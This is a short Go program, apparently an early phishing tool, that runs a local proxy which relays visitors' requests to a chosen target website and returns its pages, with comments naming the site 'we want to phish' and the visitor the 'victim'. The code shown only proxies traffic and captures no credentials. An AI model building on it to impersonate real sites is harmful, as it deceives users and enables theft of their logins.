package main

import (
	"bufio"
	"flag"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"time"
)

var targetURL = flag.String("target", "", "The website we want to phish")
var address = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")

// Phishes a target URL with a custom HTTP client.
type PhishingProxy struct {
	client    *http.Client
	targetURL *url.URL
}

func (p *PhishingProxy) HandleRequest(conn net.Conn) {
	reader := bufio.NewReader(conn)
	request, err := http.ReadRequest(reader)
	if err != nil {
		log.Println("Error parsing request:", err.Error())
		return
	}

	request.URL.Scheme = p.targetURL.Scheme
	request.URL.Host = p.targetURL.Host
	request.Host = p.targetURL.Host
	log.Println("Sending", request.Method, "request to", request.URL.String())

	// Prevent panics, see: https://stackoverflow.com/questions/19595860/http-request-requesturi-field-when-making-request-in-go
	request.RequestURI = ""
	resp, err := p.client.Do(request)
	if err != nil {
		log.Println("Proxy error:", err.Error())
		return
	}

	log.Println("Got response", resp.Status)
	responseBody, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Println("Error converting requests to bytes:", err.Error())
		return
	}
	_, err = conn.Write(responseBody)
	if err != nil {
		log.Println("Error responding to victim:", err.Error())
		return
	}
	err = conn.Close()
	if err != nil {
		log.Println("Error closing connection: ", err.Error())
		return
	}
}

func main() {
	flag.Parse()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		panic(err.Error())
	}

	server, err := net.Listen("tcp", *address)
	if err != nil {
		panic(err.Error())
	}
	log.Println("Listening on:", *address)

	client := &http.Client{
		Timeout: 20 * time.Second,
	}
	phishingProxy := &PhishingProxy{
		client:    client,
		targetURL: u,
	}
	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Error when accepting request, ", err.Error())
		}
		go phishingProxy.HandleRequest(conn)
	}
}
